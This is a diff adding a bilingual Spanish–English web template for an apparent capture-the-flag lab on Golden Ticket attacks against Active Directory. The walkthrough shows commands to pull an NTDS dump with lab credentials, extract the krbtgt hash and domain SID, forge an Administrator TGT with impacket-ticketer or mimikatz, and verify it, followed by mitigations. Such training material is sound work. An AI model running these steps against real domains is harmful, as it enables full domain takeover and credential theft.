@@ -1,0 +1,148 @@
+{% extends "base.html" %}
+{% block title %}AD 13 – Golden Ticket – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_golden_ticket_obj_desc">El hash de krbtgt (obtenido en el lab AD 10) firma todos los TGT del dominio. Fórjate un TGT arbitrario con la identidad que quieras y demuestra su validez descifrándolo con la misma clave.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>verificación local del ticket forjado</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este Domain Controller</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400">Un Golden Ticket forjado correctamente pasaría la validación de un DC real (usa la clave legítima de krbtgt). El bloqueo aquí es distinto: para <em>usar</em> el TGT contra un recurso SMB hace falta un TGS-REQ adicional al KDC, y el KDC embebido de Samba tiene incompatibilidades conocidas con esa fase del protocolo en los clientes actuales (impacket, la misma limitación que afecta a Kerberoasting). Para demostrar el forjado con la misma precisión criptográfica, este lab valida el ticket <strong>descifrándolo localmente</strong> con la clave de krbtgt — la misma prueba matemática que hace que el ataque comprometa el dominio en producción.</p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Forjar el TGT con el hash de krbtgt (del lab AD 10)
+impacket-ticketer -nthash '&lt;hash_NT_krbtgt&gt;' -domain-sid '&lt;DOMAIN_SID&gt;' \
+  -domain {{ ad_realm_lower }} Administrator
+
+# Verificar localmente (script descargable de //{{ ad_dc_host }}/public/)
+python3 verify_ticket.py Administrator.ccache '&lt;hash_NT_krbtgt&gt;' Administrator</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Por qué es el premio gordo</h3>
+    <p>Todo TGT del dominio va cifrado y firmado con la clave de la cuenta <code>krbtgt</code>. Si tienes su hash, puedes fabricar un TGT <em>arbitrario</em>: cualquier usuario (incluso uno inexistente), en cualquier grupo (incluidos Domain Admins), con la caducidad que quieras. El KDC lo aceptará como legítimo porque la firma cuadra. Es persistencia total del dominio hasta que se rote <strong>dos veces</strong> el hash de krbtgt.</p>
+
+    <h3>2 · Reunir los ingredientes (del lab AD 10)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+
+nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+export KRBTGT_NT=$(grep 'krbtgt' ntds_dump.txt | cut -d: -f4)
+export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
+echo "krbtgt hash: $KRBTGT_NT"
+echo "Domain SID: $DOMSID"</pre>
+
+    <h3>3 · Forjar el Golden Ticket</h3>
+    <pre>impacket-ticketer \
+  -nthash "$KRBTGT_NT" \
+  -domain-sid "$DOMSID" \
+  -domain {{ ad_realm_lower }} \
+  Administrator
+
+export KRB5CCNAME=Administrator.ccache
+klist    # deberías ver un krbtgt/{{ ad_realm }} válido ~10 años</pre>
+    <p>Puedes suplantar a cualquiera; incluso inventar un usuario y meterlo en Domain Admins con <code>-groups 512</code>.</p>
+
+    <h3>4 · Por qué el acceso en vivo a un share falla aquí (y funciona en producción)</h3>
+    <pre>impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}
+# [-] Kerberos SessionError: KRB_AP_ERR_BADKEYVER / errores de TGS-REQ</pre>
+    <p>El TGT forjado es válido — el problema es la fase <em>siguiente</em>: para acceder a un recurso SMB, el cliente debe pedirle al KDC un ticket de servicio (TGS-REQ) usando ese TGT. El KDC embebido de Samba tiene incompatibilidades conocidas con esa fase del protocolo en las herramientas actuales (la misma limitación que impide completar Kerberoasting en vivo). En un Domain Controller Windows real, este mismo Golden Ticket te daría acceso total al dominio.</p>
+
+    <h3>5 · Verificar el forjado localmente</h3>
+    <p>Descarga el script de verificación (descifra el TGT con la misma clave que usaste para forjarlo y confirma la identidad reclamada):</p>
+    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+
+python3 verify_ticket.py Administrator.ccache "$KRBTGT_NT" Administrator</pre>
+    <pre>Ticket descifrado correctamente con la clave proporcionada.
+Identidad reclamada (cname): Administrator
+Realm: HACKLABS.LOCAL
+OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
+
+    <h3>6 · Capturar la flag</h3>
+    <p>La verificación exitosa demuestra que el TGT forjado es criptográficamente válido, está firmado por krbtgt y reclama la identidad de Administrator — exactamente lo que un DC real validaría para conceder control total del dominio:</p>
+    <pre>HL{···}</pre>
+
+    <h3>Bonus · Variante mimikatz (desde Windows)</h3>
+    <pre>mimikatz # kerberos::golden /user:Administrator /domain:{{ ad_realm_lower }} ^
+  /sid:&lt;DOMAIN_SID&gt; /krbtgt:&lt;hash_NT_krbtgt&gt; /ptt</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Rotar el hash de <code>krbtgt</code> <strong>dos veces</strong> tras cualquier sospecha de compromiso (invalida los golden tickets).</li>
+      <li>Reducir la vida máxima de los TGT y aplicar la firma del PAC (KB5008380).</li>
+      <li>Alertar sobre TGTs con vida anómala o grupos incoherentes en el PAC; proteger el DC como Tier 0.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">impacket-ticketer</span> <span class="tools-badge">impacket-secretsdump</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (kerberos::golden)</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Why it's the jackpot</h3>
+    <p>Every TGT in the domain is encrypted and signed with the <code>krbtgt</code> account key. If you have its hash you can craft an <em>arbitrary</em> TGT: any user (even a non-existent one), in any group (including Domain Admins), with any lifetime you like. The KDC accepts it as legitimate because the signature checks out. It is full domain persistence until the krbtgt hash is rotated <strong>twice</strong>.</p>
+
+    <h3>2 · Gather the ingredients (from lab AD 10)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+
+nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+export KRBTGT_NT=$(grep 'krbtgt' ntds_dump.txt | cut -d: -f4)
+export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
+echo "krbtgt hash: $KRBTGT_NT"
+echo "Domain SID: $DOMSID"</pre>
+
+    <h3>3 · Forge the Golden Ticket</h3>
+    <pre>impacket-ticketer \
+  -nthash "$KRBTGT_NT" \
+  -domain-sid "$DOMSID" \
+  -domain {{ ad_realm_lower }} \
+  Administrator
+
+export KRB5CCNAME=Administrator.ccache
+klist    # you should see a valid krbtgt/{{ ad_realm }} for ~10 years</pre>
+    <p>You can impersonate anyone; you can even invent a user and drop it into Domain Admins with <code>-groups 512</code>.</p>
+
+    <h3>4 · Why live share access fails here (and works in production)</h3>
+    <pre>impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}
+# [-] Kerberos SessionError: KRB_AP_ERR_BADKEYVER / TGS-REQ errors</pre>
+    <p>The forged TGT is valid — the problem is the <em>next</em> phase: to reach an SMB share, the client must request a service ticket (TGS-REQ) from the KDC using that TGT. Samba's embedded KDC has known incompatibilities with that protocol phase in current tooling (the same limitation that blocks live Kerberoasting). Against a real Windows Domain Controller, this exact Golden Ticket would grant you full domain control.</p>
+
+    <h3>5 · Verify the forge locally</h3>
+    <p>Download the verification script (decrypts the TGT with the same key you used to forge it and confirms the claimed identity):</p>
+    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+
+python3 verify_ticket.py Administrator.ccache "$KRBTGT_NT" Administrator</pre>
+    <pre>Ticket descifrado correctamente con la clave proporcionada.
+Identidad reclamada (cname): Administrator
+Realm: HACKLABS.LOCAL
+OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
+
+    <h3>6 · Capture the flag</h3>
+    <p>The successful verification proves the forged TGT is cryptographically valid, signed by krbtgt, and claims Administrator's identity — exactly what a real DC would validate to grant full domain control:</p>
+    <pre>HL{···}</pre>
+
+    <h3>Bonus · mimikatz variant (from Windows)</h3>
+    <pre>mimikatz # kerberos::golden /user:Administrator /domain:{{ ad_realm_lower }} ^
+  /sid:&lt;DOMAIN_SID&gt; /krbtgt:&lt;krbtgt_NT_hash&gt; /ptt</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Rotate the <code>krbtgt</code> hash <strong>twice</strong> after any suspected compromise (invalidates golden tickets).</li>
+      <li>Reduce maximum TGT lifetime and enforce PAC signing (KB5008380).</li>
+      <li>Alert on TGTs with abnormal lifetimes or inconsistent PAC groups; treat the DC as Tier 0.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">impacket-ticketer</span> <span class="tools-badge">impacket-secretsdump</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (kerberos::golden)</span></div>
+  </div>
+</div>
+{% endblock %}
